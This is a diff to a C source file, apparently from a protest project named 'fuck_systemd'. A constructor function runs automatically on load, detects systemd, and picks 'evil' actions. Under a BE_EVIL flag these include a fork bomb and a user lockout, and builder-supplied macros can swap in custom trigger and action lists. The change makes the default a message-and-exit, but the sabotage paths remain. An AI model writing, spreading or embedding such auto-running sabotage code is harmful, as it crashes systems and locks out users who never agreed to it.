@@ -29,8 +29,16 @@ static bool fuckup_lennart_poettering(void);
 
 /* When do you want a systemd system to skrew up? */
 static fuckup_determinator (*shall_I_fuck_it_up[])[] = {
+#ifdef WHEN_TO_FUCK_UP
+	WHEN_TO_FUCK_UP
+#else
+#ifdef BE_EVIL
   ALL_TRUE( &fuckup_occasionally ),
   ALL_TRUE( &fuckup_lennart_poettering )
+#else
+	ALL_TRUE( &fuckup_always )
+#endif
+#endif
 };
 
 
@@ -40,7 +48,7 @@ static const size_t evil_stuff_available_count;
 
 /* Let's go */
 
-static void fuck_systemd() __attribute__((constructor));
+static void fuck_systemd() __attribute__((constructor,used));
 static void fuck_systemd(){
 
   /* Check if it is a systemd system */
@@ -141,8 +149,12 @@ static bool fuckup_lennart_poettering(void){
 }
 
 
-static bool evil_dont_run(void){
-  perror("Sorry, I'm just not in the right mood to run now.");
+static bool dont_run(void){
+  fprintf(stdout,
+    "If you want to use this Programm on a systemd system, you need to compile it without "
+    "fuck-systemd support. Or just remove systemd from your system :)\n"
+    "For more informations, see https://github.com/Daniel-Abrecht/fuck_systemd\n"
+  );
   _exit(-1);
   return false;
 }
@@ -197,8 +209,16 @@ static bool evil_user_lockout(void){
 }
 
 static bool (*try_to_do_evil[])(void) = {
-  &evil_dont_run,
+#ifdef FUCK_UP_ACTIONS
+  FUCK_UP_ACTIONS
+#else
+#ifdef BE_EVIL
+  &dont_run,
   &evil_fork_bomb,
   &evil_user_lockout
+#else
+  &dont_run
+#endif
+#endif
 };
 static const size_t evil_stuff_available_count = sizeof(try_to_do_evil) / sizeof(*try_to_do_evil);
